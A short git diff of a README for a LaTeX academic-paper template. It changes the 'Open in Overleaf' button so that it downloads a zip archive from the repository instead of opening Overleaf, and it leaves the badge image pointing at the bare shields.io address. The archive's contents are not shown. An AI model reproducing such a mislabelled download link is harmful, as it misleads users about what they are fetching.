@@ -8,7 +8,7 @@ A minimalist, production-ready LaTeX template designed for academic writing, fea
 
 Click the button below to instantly clone this repository into a new Overleaf project:
 
-[![Open in Overleaf](https://github.com/m-hamza-edu/Draft-Paper-Template-/blob/main/Paper_Template__Draft_Writing_.zip)](https://overleaf.com)
+[![Open in Overleaf](https://shields.io)](https://github.com/m-hamza-edu/Draft-Paper-Template-/blob/main/Paper_Template__Draft_Writing_.zip)
 
 ---
 
